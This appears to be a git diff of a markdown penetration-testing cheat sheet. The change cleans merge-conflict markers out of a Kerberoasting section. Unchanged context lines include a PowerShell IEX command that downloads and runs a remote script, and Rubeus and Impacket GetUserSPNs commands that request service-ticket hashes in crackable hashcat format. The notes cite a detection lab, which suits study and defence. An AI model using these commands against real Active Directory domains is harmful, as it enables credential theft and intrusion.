@@ -12,7 +12,6 @@ IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.c
 ```
 
 #### Kerberoasting using Rubeus
-<<<<<<< HEAD
 The following command shows an example of how to peroform a kerberoasting attack using Rubeus. The outfile parameter ensures that the hashes are in a crackable (non newline delimited) format.
 
 ```.\Rubeus.exe kerberoast /creduser:<Domain>\<User> /credpassword:<Password> /domain:<Domain> /dc:<DomainController> /format:hashcat /outfile:roast.txt```
@@ -22,7 +21,6 @@ The following command shows an example of how to peroform a kerberoasting attack
 ```
 GetUserSPNs.py domain.local/username:password  -request
 ```
-=======
 The following Rubeus command executes a keberoast attack for all users within the domain that have a Service Principle Name (SPN) configured.
 
 ```Rubeus kerberoast```
@@ -56,4 +54,3 @@ Broken down, it does the following:
 
 #### References
 https://labs.f-secure.com/blog/attack-detection-fundamentals-discovery-and-lateral-movement-lab-1
->>>>>>> fbd262c393cfa3488a62753a98521dcbd6d04924
